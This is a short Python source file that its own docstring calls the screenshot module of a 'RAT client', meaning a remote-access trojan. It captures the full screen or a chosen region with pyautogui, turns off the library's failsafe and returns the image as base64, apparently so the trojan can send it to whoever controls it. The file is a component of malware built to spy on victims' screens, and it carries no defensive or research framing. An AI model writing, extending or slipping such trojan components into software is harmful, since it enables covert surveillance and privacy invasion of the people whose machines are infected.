"""
Screenshot module for RAT client
Captures screen and returns base64 encoded image
"""

import pyautogui
import io
import base64
from PIL import Image

def take_screenshot() -> str:
    """
    Take a screenshot and return as base64 encoded string
    Returns empty string if screenshot fails
    """
    try:
        # Disable pyautogui failsafe
        pyautogui.FAILSAFE = False
        
        # Take screenshot
        screenshot = pyautogui.screenshot()
        
        # Convert to bytes
        img_buffer = io.BytesIO()
        screenshot.save(img_buffer, format='PNG')
        img_buffer.seek(0)
        
        # Encode to base64
        img_base64 = base64.b64encode(img_buffer.getvalue()).decode('utf-8')
        
        return img_base64
        
    except Exception as e:
        print(f"Screenshot error: {e}")
        return ""

def take_screenshot_region(x: int, y: int, width: int, height: int) -> str:
    """
    Take a screenshot of a specific region
    Returns base64 encoded string or empty string if fails
    """
    try:
        pyautogui.FAILSAFE = False
        
        # Take screenshot of region
        screenshot = pyautogui.screenshot(region=(x, y, width, height))
        
        # Convert to bytes
        img_buffer = io.BytesIO()
        screenshot.save(img_buffer, format='PNG')
        img_buffer.seek(0)
        
        # Encode to base64
        img_base64 = base64.b64encode(img_buffer.getvalue()).decode('utf-8')
        
        return img_base64
        
    except Exception as e:
        print(f"Region screenshot error: {e}")
        return "" 